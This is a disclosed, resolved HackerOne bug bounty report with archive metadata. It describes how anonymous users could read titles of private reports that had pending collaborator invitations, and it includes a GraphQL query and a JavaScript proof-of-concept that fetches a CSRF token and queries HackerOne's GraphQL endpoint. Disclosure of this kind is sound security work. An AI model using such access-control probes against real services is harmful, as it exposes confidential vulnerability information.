---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/improper-access-control-generic
  - env/web
  - vuln/csrf
  - vuln/cors-misconfig
  - trigger/cors-origin
substate: "resolved"
weakness: "Improper Access Control - Generic"
enriched: true
body: true
date: 2024-01-16
submitted: 2024-01-11T06:21:00.074Z
bounty_usd: null
votes: 257
cve: []
program: "[[programs/security|HackerOne]]"
reporter: "ahacker1"
source: "https://hackerone.com/reports/2312029"
title: "View Titles of Private Reports with pending email invitation"
---
# View Titles of Private Reports with pending email invitation

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 257 | **Program:** HackerOne | **Disclosed:** 2024-01-16

- Report: [https://hackerone.com/reports/2312029](https://hackerone.com/reports/2312029)
- CWE: Improper Access Control - Generic
- Submitted: 2024-01-11T06:21:00.074Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:**

If a private report has a pending email invitation for collaboration, an anonymous user can see the title of the report.
This only works for anonymous users, and the collaboration invitation must be through Manage Collaborators invitation panel.

**Description:**

### Steps To Reproduce

1. As victim:
In a report to a bug bounty program, add a collaborator, using any email, such as: ██████████
Save the integer ID of the report.

2. In a new, **anonymous/unauthenticated/logged-out** session:
Send GraphQL request, replacing PRIVATE_REPORT_ID integer:
```graphql
{
  report(id:IPRIVATE_REPORT_ID){
    title
  }
}
```
OR run JS implementation:
By visiting hackerone.com/hacktivity as anonymous:
```js
const csrf_token = document.getElementsByName("csrf-token")[0].getAttribute("content")
const REPORT_ID = PRIVATE_REPORT_ID // integer

var resp = await(await fetch("https://hackerone.com/graphql", {
  "headers": {
    "accept": "*/*",
    "content-type": "application/json",
    "x-csrf-token": csrf_token,
  },
  "body": JSON.stringify({
    "operationName": "HacktivitySearchQuery",
    "variables": {
        "reportId": REPORT_ID
    },
    "query": `query HacktivitySearchQuery($reportId: Int!) {
  report(id: $reportId){
    id
    url
    title
  }
}
`
}),
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
})).json()
console.log(resp.data.report)
```
The title of the report is the response, confirming the vulnerability.

## Impact

Can read titles of possibly unfixed reports. This can be leveraged against the program, depending on the specificity of the title in the report.

## Timeline

- **Report Filed**
- **Report Collaborator Invited**
- **2024-01-12** @h1_analyst_pranav: Hi @ahacker1 ,

Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Have a great day! 

Kind regards,
@h1_analyst_pranav
- **Report Needs More Info**
- **Report Collaborator Invited**
- **Report New**
- **2024-01-12** @ahacker1: ███
I would greatly appreciate it.
Thanks,
@ahacker1
- **Report Pending Program Review**
- **Report Retesting**
- **Report Collaborator Invited**
- **User Completed Retest**
- **Report Retest Approved**
- **Report Resolved**
- **2024-01-13** @ahacker1: Report has been resolved but the bounty was not paid?
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Bounty Awarded**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Report Collaborator Invited**
- **Report Collaborator Joined**
- **Bounty Awarded**
- **Bounty Awarded**
